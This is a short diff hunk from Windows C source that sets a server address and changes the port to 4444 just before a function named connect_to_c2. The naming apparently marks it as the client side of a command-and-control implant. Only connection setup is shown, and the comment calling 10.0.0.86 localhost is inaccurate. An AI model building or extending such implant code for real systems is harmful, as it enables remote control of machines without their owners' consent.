@@ -10,7 +10,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 #define SERVER_IP "10.0.0.86"  // Localhost for testing
-#define SERVER_PORT 443
+#define SERVER_PORT 4444
 
 void connect_to_c2() {
 	WSADATA wsa;
